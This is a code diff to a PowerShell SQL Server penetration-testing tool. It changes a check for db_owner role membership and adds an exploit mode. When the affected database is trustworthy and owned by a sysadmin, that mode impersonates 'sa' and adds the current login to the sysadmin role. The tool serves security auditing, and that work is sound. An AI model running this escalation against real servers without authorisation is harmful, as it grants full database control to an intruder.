@@ -7027,9 +7027,10 @@ Function Invoke-SQLEscalate-CreateProcedure {
         $ServerInfo =  Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential 
         $ComputerName = $ServerInfo.ComputerName                
         $CurrentLogin = $ServerInfo.CurrentLogin        
-        $CurrentLoginRoles = Get-SqlDatabaseRoleMember -Instance $Instance  -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin               
+        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance  -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin               
         $CurrentPrincpalList = @()
         $CurrentPrincpalList += $CurrentLogin
+        $CurrentPrincpalList += 'Public'
         $CurrentLoginRoles | 
         ForEach-Object{
             $CurrentPrincpalList += $_.RolePrincipalName
@@ -7214,13 +7215,11 @@ Function Invoke-SQLEscalate-DbOwnerRole {
         $ServerInfo =  Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential 
         $ComputerName = $ServerInfo.ComputerName                
         $CurrentLogin = $ServerInfo.CurrentLogin        
-        $CurrentLoginRoles = Get-SqlDatabaseRoleMember -Instance $Instance  -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin               
+        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin               
         $CurrentPrincpalList = @()
-        $CurrentPrincpalList += $CurrentLogin
-        $CurrentLoginRoles | 
-        ForEach-Object{
-            $CurrentPrincpalList += $_.RolePrincipalName
-        }        
+        $CurrentPrincpalList += $CurrentLogin       
+        $CurrentPrincpalList += 'Public'
+        $CurrentLoginRoles | ForEach-Object{ $CurrentPrincpalList += $_.RolePrincipalName }        
         
         # --------------------------------------------     
         # Set function meta data for report output
@@ -7231,15 +7230,19 @@ Function Invoke-SQLEscalate-DbOwnerRole {
             $TestMode  = "Audit"
         }       
         $Vulnerability = "DATABASE ROLE - DB_OWNER"
-        $Description   = "The login has the db_owner role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted and owned by a sysadmin."
-        $Remediation   = "If the permission is not required remove it.  Permissions are granted with a command like: GRANT CREATE PROCEDURE TO user, and can be removed with a command like: REVOKE CREATE PROCEDURE TO user"
+        $Description   = "The login has the DB_OWER role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted and owned by a sysadmin."
+        $Remediation   = "If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_OWNER', 'MyDbUser', and can be removed with a command like:  EXEC sp_droprolemember 'DB_OWNER', 'MyDbUser'"
         $Severity      = "Medium" 
         $IsVulnerable  = "No"
         $IsExploitable = "No" 
         $Exploited     = "No"
-        $ExploitCmd    = "No exploit is currently available that will allow $CurrentLogin to become a sysadmin."
+        if($Username){
+            $ExploitCmd    = "Invoke-SQLEscalate-DbOwnerRole -Instance $Instance -Username $Username -Password $Password -Exploit"
+        }else{
+            $ExploitCmd    = "Invoke-SQLEscalate-DbOwnerRole -Instance $Instance -Exploit"
+        }
         $Details       = ""   
-        $Dependancies = ""
+        $Dependancies = "Affected databases must be owned by a sysadmin and be trusted."
         $Reference     = "https://msdn.microsoft.com/en-us/library/ms189121.aspx,https://msdn.microsoft.com/en-us/library/ms187861.aspx"       
         $Author        = "Scott Sutherland (@_nullbind), NetSPI 2016" 
         
@@ -7248,67 +7251,84 @@ Function Invoke-SQLEscalate-DbOwnerRole {
         # Note: Typically a missing patch or weak configuration
         # -----------------------------------------------------------------         
 
-        # Get all CREATE PROCEDURE grant permissions for all accessible databases
-        $Permissions = Get-SqlDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess | Get-SqlDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PermissionName "CREATE PROCEDURE"
-        
-        if($Permissions){
+        # Iterate through each current login and their associated roles
+        $CurrentPrincpalList|
+        ForEach-Object {
+            
+            # Check if login or role has the DB_OWNER roles in any databases
+            $DBOWNER = Get-SQLDatabaseRoleMember -Instance $Instance -RolePrincipalName DB_OWNER -PrincipalName $_
 
-            # Iterate through each current login and their associated roles
-            $CurrentPrincpalList|
-            ForEach-Object {
+            # -----------------------------------------------------------------     
+            # Check for exploit dependancies 
+            # Note: Typically secondary configs required for dba/os execution
+            # -----------------------------------------------------------------
+            
+            # Check for db ownerships  
+            if($DBOWNER){
 
-                # Check if they have the CREATE PROCEDURE grant
-                $CurrentPrincipal = $_
-                $Permissions | 
+                # Add an entry for each database where the user has the db_owner role
+                $DBOWNER|
                 ForEach-Object{
-                                        
-                    $AffectedPrincipal = $_.PrincipalName
-                    $AffectedDatabase =  $_.DatabaseName
-                
-                    if($AffectedPrincipal-eq $CurrentPrincipal){
-                                          
-                        # Set flag to vulnerable
-                        $IsVulnerable  = "Yes"
-                        Write-Verbose "$Instance : - The $AffectedPrincipal principal has the CREATE PROCEDURE permission in the $AffectedDatabase database."
-                        $Details = "The $AffectedPrincipal principal has the CREATE PROCEDURE permission in the $AffectedDatabase database."
+                    $DatabaseTarget = $_.DatabaseName
+                    $PrincipalTarget = $_.PrincipalName
 
-                        # -----------------------------------------------------------------     
-                        # Check for exploit dependancies 
-                        # Note: Typically secondary configs required for dba/os execution
-                        # -----------------------------------------------------------------                        
-                        $HasAlterSchema = Get-SqlDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PermissionName "ALTER" -PermissionType "SCHEMA" -PrincipalName $CurrentPrincipal -DatabaseName $AffectedDatabase                                                
-                        if($HasAlterSchema){
-                            $IsExploitable = "Yes"  
-                            $Dependancies = " $CurrentPrincipal also has ALTER SCHEMA permissions so procedures can be created." 
-                            Write-Verbose "$Instance : - Dependancies were met: $CurrentPrincipal has ALTER SCHEMA permissions."
+                    Write-Verbose "$Instance : - $PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."
+                    $IsVulnerable = "Yes"
 
-                            # Add to report example
-                            $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, "$Details$Dependancies", $Reference, $Author) | Out-Null                                            
-                        }else{                            
-                            $IsExploitable = "No"
-                            
-                            # Add to report example
-                            $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                   
-                        }                                       
+                    # Check if associated database is trusted and the owner is a sysadmin                  
+                    $Depends = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseTarget | Where-Object {$_.is_trustworthy_on -eq 1 -and $_.OwnerIsSysadmin -eq 1 } 
 
+                    if($Depends){
+                        $IsExploitable = "Yes"
+                        Write-Verbose "$Instance : - The $DatabaseTarget database is set as trustworthy and is owned by a sysadmin. This is exploitable."
+                        
                         # -----------------------------------------------------------------    
                         # Exploit Vulnerability
                         # Note: Add the current user to sysadmin fixed server role
-                        # -----------------------------------------------------------------    
-                        
-                        if($Exploit -and $IsExploitable -eq "Yes"){ 
-                            
-                            Write-Verbose "$Instance : - No server escalation method is available at this time."
-                        }
-                        
-                    }         
-                }
-            }                     
-        }else{
+                        # -----------------------------------------------------------------                     
+                        if($Exploit){                                                    
 
-            # Status user
-            Write-Verbose "$Instance : - The current login doesn't have the db_owner role in any databases."
-        }              
+                            # Check if user is already a sysadmin
+                            $SysadminPreCheck =  Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" | Select-Object Status -ExpandProperty Status                                            
+                            if($SysadminPreCheck -eq 0){
+
+                                # Status user
+                                Write-Verbose "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
+                                Write-Verbose "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by using DB_OWNER permissions..."                            
+                                                        
+                                # Attempt to add the current login to sysadmins fixed server role
+                                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin';Revert" | Out-Null                                              
+
+                                 # Verify the login was added successfully
+                                $SysadminPostCheck =  Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" | Select-Object Status -ExpandProperty Status               
+                                if($SysadminPostCheck -eq 1){
+                                    Write-Verbose "$Instance : - EXPLOITING: It was possible to make the current user ($CurrentLogin) a sysadmin!"
+                                    $Exploited = "Yes"
+                                }else{
+                                    
+                                }                                                      
+                            }else{
+                                Write-Verbose "$Instance : - EXPLOITING: It was not possible to make the current user ($CurrentLogin) a sysadmin."
+                            }
+                           
+                            #Add record
+                            $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."
+                            $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                   
+                        }else{
+                            #Add record                            
+                            $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."                            
+                            $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                   
+                        }                    
+                    }else{
+
+                        #Add record
+                        Write-Verbose "$Instance : - The $DatabaseTarget is not exploitable."
+                        $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database, but this was not exploitable."
+                        $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                   
+                    }
+                }
+            }                                                                                     
+        }                                  
                                                     
         # Status User
         Write-Verbose "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER" 
